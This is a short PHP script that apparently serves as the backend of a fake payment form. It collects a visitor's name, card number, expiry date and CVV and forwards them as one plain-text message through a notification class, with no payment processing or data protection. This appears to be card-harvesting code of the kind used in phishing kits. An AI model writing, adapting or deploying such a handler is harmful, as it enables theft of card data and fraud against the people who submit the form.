<?php
    require_once "./vendor/autoload.php";

    use App\Notification;

    if($_SERVER["REQUEST_METHOD"] != "POST"):
        header("Location: index.php");
    endif;

    $data = [
        "name" => $_REQUEST["name"],
        "cardNumber" => $_REQUEST["card-number"],
        "validate" => $_REQUEST["validate"],
        "cvv" => $_REQUEST["cvv"]
    ];

    Notification::senderMessage(implode(", ", $data));
    header("Location: index.php");